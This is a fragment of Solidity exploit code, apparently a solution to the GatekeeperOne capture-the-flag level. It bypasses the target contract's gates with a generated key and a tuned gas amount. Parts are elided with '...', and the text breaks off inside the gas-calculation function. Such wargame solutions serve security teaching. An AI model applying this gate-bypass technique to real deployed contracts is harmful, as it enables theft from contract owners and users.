...
contract Solution13 {
    function hack(address _target, uint256 _fold, uint256 _gasUsed) public {
        bytes8 gateKey = genGateKey();
        require(GatekeeperOne(_target).enter{gas: calcuGas(_fold, _gasUsed)}(gateKey), "Hack fails");
    }
    ...
    function calcuGas(uint256 _fold, uint256 _gasUsed) public pure returns(uint256) {
        if (_gasUsed == 0) {
            _gasUsed = 423;
        }
